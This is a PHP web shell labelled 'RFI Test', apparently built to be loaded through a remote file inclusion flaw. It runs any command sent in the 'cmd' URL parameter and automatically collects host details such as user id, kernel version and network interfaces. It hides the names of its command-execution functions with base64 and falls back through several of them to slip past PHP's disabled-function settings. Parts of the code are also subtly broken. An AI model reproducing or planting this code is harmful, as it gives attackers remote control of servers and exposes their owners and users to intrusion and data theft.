<H1>RFI Test</H1>
<?php
error_reporting(E_ALL ^ E_WARNING);
ini_set('display_errors', 1);
$myip=htmlspecialchars($_SERVER['REMOTE_ADDR']);

echo "<style>\n
    p { font-family: \"Courier New\", Courier, monospace; \n
        text-align: left\n
        background-color: rbga(0,0,0,0.1); \n
        padding-left: 15px;\n
    }\n
    textarea { max-width: 900px;
               white-space: pre;\n
               overflow-wrap: normal;\n
               overflow-x: scroll;\n
    }\n
    table,tr,td{ border: solid 1px black;\n
                 vertical-align: top;\n
    }</style>\n";
echo "<div style='width: 800px; text-align: left; margin:0 auto;'>\n";

if(isset($_GET['cmd'])) {
    runcommand($_GET['cmd'], true);
}

echo "</div>\n";

textareacommand("hostname", false);
textareacommand("whoami", false);
textareacommand("id", false);
textareacommand("sestatus", false);
textareacommand("uname -a", false);
textareacommand("cat /proc/version", false);
textareacommand("cat /etc/issue", false);
textareacommand("/sbin/ifconfig || ip addr", false);

function textareacommand($input, $sorted){
    echo "<b>Command Output: $input</b><br/>\n";
    echo "<pre>\n";
    $output= explode("\n", cexec($input));
    if ($sorted === true) { sort($output);}
    foreach($output as $key) {
       echo $key. "\n";
    }
    echo "</pre><br/>\n";
}

function runcommand($input, $sorted){
    echo "<B>Command Output for: $input</B><br/>\n";
    echo "<pre>\n";
    $output = explode("\n", cexec($input));
    if ($sorted === true) { sort($output);}
    foreach($output as $key) {
       echo $key. "<br/>\n";
    }
    echo "</pre>\n";
}

function cexec($input){
    $dis=@ini_get('disable_functions');
    $ic=base64_decode('aXNfY2FsbGFibGU=');
    $ia=base64_decode('aW5fYXJyYXk=');
    $e1=base64_decode('c3lzdGVt');
    $e2=base64_decode('c2hlbGxfZXhlYw==');
    $e3=base64_decode('ZXhlYw==');
    $e4=base64_decode('cG9wZW4=');
    $e5=base64_decode('cGFzc3RocnU=');
    $e6=base64_decode('cHJvY19vcGVu');
    $e7=base64_decode('cGlwZQ==');
    if (FALSE !== strpos(strtolower(PHP_OS), 'win' )) {
       $cof = "C:\\windows\\temp\\cout.txt";
       $cout = " 2>&1 " . $cof . "\n";
    }
    if (FALSE !== strpos(strtolower(PHP_OS), 'lin') || FALSE !== strpos(strtolower(PHP_OS), 'bsd') || \
        FALSE !== strpos(strtolower(PHP_OS), 'sol') || FALSE !== strpos(strtolower(PHP_OS), 'unk')) {
       $cof ="/var/tmp/cout.txt";
       $cout = " 2>&1 " . $cof . "\n";
    }
    if (empty($dis)) {
        return eval($e1."('".$input."');");
    }else{
        if($ic($e1)and!$ia($e1, $dis)){
            return eval($e1."('".$input."');");
        }else if($ic($e2)and!$ia($e2, $dis)){
            return eval($e2."('".$input."');");
        }else if($ic($e3)and!$ia($e3, $dis)){
            return eval($e3."('".$input."');");
        }else if($ic($e4)and!$ia($e4, $dis)){
            return eval($e4."('".$input."','r');");
        }else if($ic($e5)and!$ia($e5, $dis)){
            passthru($input . $cout);
            return eval($e5."('".$input.$cout."');");
            $output = file_get_contents($cof);
            if (file_exists($cof)){unlink($cof);}
        }else if($ic($e6)and!$ia($e6, $dis)){
            @proc_close($handle);
            $handle=eval($e6.'($input,array(array($e7,\'r\'),array($e7,\'w\'),array($e7,\'w\')),$p1);');
            $o=NULL;
            while(!feof($p1[1])){
                $o.=fread($p1[1],1024);
            }
            @proc_close($handle);
        }else {
            return 'Can\'t execute the things!';
        }
    }
}


function is_32bit(){
  return PHP_INT_SIZE === 4;
}

?>
